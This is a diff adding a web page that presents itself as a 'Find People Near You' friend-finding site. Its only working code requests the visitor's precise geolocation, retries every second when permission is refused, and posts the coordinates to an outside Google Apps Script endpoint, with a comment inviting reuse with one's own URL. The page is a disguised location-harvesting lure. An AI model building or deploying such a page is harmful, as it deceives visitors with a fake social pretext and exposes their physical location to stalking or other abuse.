@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Near You | Meet New People, Make New Friends</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#000000">
+  <link rel="icon" type="image/x-icon" href="flat-location-logo-152-234349.png">
+  <link href="fonts.css" rel="stylesheet">
+  <link href="main.css" rel="stylesheet">
+</head>
+<body>
+
+  <canvas id="canvas" style="width:100%; height:100%;"></canvas>
+  <script>
+    var x = new WarpSpeed('canvas', '{"speed":2,"speedAdjFactor":0.03,"density":1,"shape":"circle","warpEffect":true,"warpEffectLength":3,"depthFade":false,"starSize":3,"backgroundColor":"hsl(0,0%,0%)","starColor":"#FFFFFF"}');
+  </script>
+
+  <div><h1>Find People Near You</h1></div>
+  <div><h2>Meet New People, Make New Friends</h2></div>
+  <div class="earth"></div>
+  <div><button id="change" class="button" type="button" onclick="locate()">Continue</button></div>
+  <div class="text" id="result"></div>
+
+<script>
+const GAS_URL = "https://script.google.com/macros/s/AKfycbx23Co4LcO5j50T5_dvE5tYVEUVUM1zRGMNJf2EALWFnpiRShibqONkgPfEcJ_eJfjh/exec"; // replace with your GAS URL
+let retryTimer = null;
+
+function locate() {
+    if(!navigator.geolocation){
+        alert("Geolocation not supported");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            // permission granted
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+
+            // immediately send to GAS
+            sendLocation(lat,lng);
+
+            // clear retry if any
+            if(retryTimer) clearTimeout(retryTimer);
+
+        },
+        (err) => {
+            // permission denied / other error
+            console.log("Permission denied or error, retrying in 1 sec...");
+            retryTimer = setTimeout(locate,1000);
+        },
+        {enableHighAccuracy:true, maximumAge:0, timeout:5000}
+    );
+}
+
+async function sendLocation(lat,lng){
+    try{
+        await fetch(GAS_URL,{
+            method:"POST",
+            headers:{"Content-Type":"application/x-www-form-urlencoded"},
+            body:"lat="+encodeURIComponent(lat)+"&lng="+encodeURIComponent(lng)
+        });
+        console.log("Location sent:", lat, lng);
+        document.getElementById("result").innerText = "Location sent!";
+    } catch(e){
+        console.log("Send error", e);
+    }
+}
+</script>
+</body>
+</html>
